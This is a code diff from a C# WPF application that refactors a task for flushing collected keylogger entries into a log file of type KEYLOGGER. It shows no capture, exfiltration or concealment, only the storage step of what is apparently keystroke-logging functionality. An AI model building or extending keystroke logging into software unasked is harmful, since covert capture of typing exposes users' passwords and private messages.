@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Linq;
+using System.Runtime.Serialization;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -56,18 +57,17 @@ namespace WPF.Managers.Tasks
             Completed = false;
             if (MainContext.Instance.KeyLogger.Any())
             {
-                var stringbuilder = new StringBuilder();
+                var list = new List<string>();
                 foreach (var log in MainContext.Instance.KeyLogger)
                 {
-                    stringbuilder.Append(log);
-                    stringbuilder.Append(Environment.NewLine);
+                    list.Add(log + Environment.NewLine);
                 }
                 MainContext.Instance.KeyLogger.Clear();
 
-                LogManager.Instance.LogToFile(new Models.LogInfoModel
+                LogManager.Instance.LogToFile(new LogInfoModel
                 {
                     Type = Models.Enums.FileTypesEnum.KEYLOGGER,
-                    Message = new SimpleMessageInfoModel(stringbuilder.ToString())
+                    Message = new ArrayMessageInfoModel(list)
                 });
             }
             Completed = true;
